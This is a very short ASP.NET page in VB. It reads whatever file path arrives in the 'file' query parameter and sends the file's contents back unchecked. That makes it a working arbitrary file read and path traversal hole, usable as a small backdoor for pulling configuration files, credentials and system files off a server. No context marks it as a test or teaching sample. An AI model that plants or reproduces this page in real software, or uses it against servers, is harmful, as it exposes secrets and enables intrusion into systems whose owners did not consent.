<% @ Page Language="VB" %>
<% Response.Buffer=True %>
<%
Dim file As String = Request.QueryString("file")
Dim readText As String = System.IO.File.ReadAllText(file)
response.write(readText)
%>
